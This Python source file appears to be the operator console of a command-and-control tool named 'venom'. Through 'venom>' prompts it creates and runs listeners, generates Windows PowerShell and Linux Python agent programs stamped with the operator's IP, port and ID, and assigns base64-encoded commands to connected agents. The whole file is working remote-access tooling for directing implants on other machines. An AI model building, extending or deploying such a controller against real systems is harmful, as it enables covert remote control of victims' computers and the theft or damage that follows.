import db
import route
from random import seed
from random import randint
from datetime import datetime 
import socket as s 
from threading import Thread
from base64 import b64encode
from pprint import pprint 


s = s.socket(s.AF_INET, s.SOCK_DGRAM) 
s.connect(("8.8.8.8", 80))


def prettyPrint(cursor): 
    for i in cursor:
        pprint(i)


def Listeners(): 

    menu = """ 
            [1] Create listener
            [2] Delete listener
            [3] Run Listener
            [4] Exit 
             """ 
    
    if(list(db.getListeners())): 
        print("Your Listeners: ") 
        prettyPrint(db.getListeners())   
    
    else: 
        print("Looks like you have no listeners yet!") 
   
    
    while (True):
        print(menu) 
        c = input("venom>")
        
        if (c == '1'): 
            seed() 
            id = str(randint(0,30000)) 
            print("[+] Enter port to bind to ")
            port = input("venom>")
            db.saveListener(id, port) 
            print("[*] Listener on port %s successfuly created!" % port) 
        
        elif (c == '2'):      
            print("[*] Your Listeners: ") 
            prettyPrint(db.getListeners())
            print("[+] Please enter the listener id to delete")  
            id = input("venom>") 
            db.delListener(id)
        
        elif (c == '3'): 
            prettyPrint(db.getListeners())
            print("[*] Please specify the listener id you want to run:")
            id = input("venom>")
            
            if (db.getListener(id)): 
                try: 
                    route.startListener(id,db.getListener(id).get('port'))
                    print("Flask server started")
                
                except KeyboardInterrupt:
                    pass 
            else: 
                print("Wrong ID!")
                pass 

        elif (c == '4'):    
            return 
       
        else:     
            pass


def Agents(): 
   
    menu = """ 
            [1] Generate Agent program
            [2] Delete Agent
            [3] Exit 
             
             """
    while (True): 
        seed() 
        print(menu) 
        c = input("venom>")
        
        if (c == '1'):
            parameters = { 
            
                'id': str(randint(0,30000)) , 
                'ip': s.getsockname()[0],
                'port': '' , 
                'timeout': '60' } 
            
            arch = """ 
            
        Choose Agent:
            
            [1] Windows
            [2] Linux
            [3] Exit 
             
             """
            print(arch)
            a = input("venom>")
            prettyPrint(db.getListeners())
            print("[+] Enter listener id to bind your agent program to ")
            parameters['port'] = db.getListener(input("venom>")).get('port')

            if (a == '1'): 
                agent = open('skeletons/agent.ps1','r')
                ext = 'ps1'
            
            elif (a == '2'): 
                agent = open('skeletons/agent.py','r') 
                ext = 'py'
            
            else: 
                pass
                
            data = agent.read()
            data = data.replace('REPLACE_IP', parameters['ip']).replace('REPLACE_PORT', parameters['port']).replace('REPLACE_ID', parameters['id'])
            agent.close() 
            with open('agents/agent_{}.{}'.format(parameters['id'],ext),'w+') as f:
                f.write(data)  
            print("[*] agent program generated and saved to " + "agents/agent_{}.{}".format(parameters['id'],ext) )
           
            #Write parameters to agent.py from /module then write output to new generated file
            
        elif (c == '2'): 
           prettyPrint(db.getAgents())
           print("Enter Agent ID that you want to delete") 
           id = input("venom>") 
           db.deleteAgent(id)
           print("Agent #%s deleted" % id)
        
        elif (c == '3'): 
            return 

        else: 
            pass 


def Venom(): 
    menu = """:: :: :::WELCOME TO VENOM MODE::: :: ::"""  
    print(menu) 
    
    while (True): 
        if (list(db.getAgents())):
            print("[*] Connected Agents: ")
            prettyPrint(db.getAgents()) 
            print("[+] Enter agent ID that you would like to interact with")
            id = input("venom>") 
            print("[+]Enter Task to agent")
            db.assignTask(id, b64encode(input("venom[AGENT#%s]>" % id).encode()))
            print("[*] Task is assigned, check agent results file!")
        
        else: 
            print("[*] No connected agents available, Exiting...") 
            return     

if __name__ == "__main__": 
    
    while (True): 
        menu = """ 
            [1] Create/Delete/Run listener
            [2] Generate agent program 
            [3] Venom mode
            [4] Exit 
             """
        print(menu)
        c = input('venom>')
        if (c == '1'): 
            Listeners() 
        
        elif (c == '2'): 
            Agents()
        
        elif (c == '3'): 
            Venom()
        
        elif (c == '4'): 
            exit(0)     
        
        else: 
            pass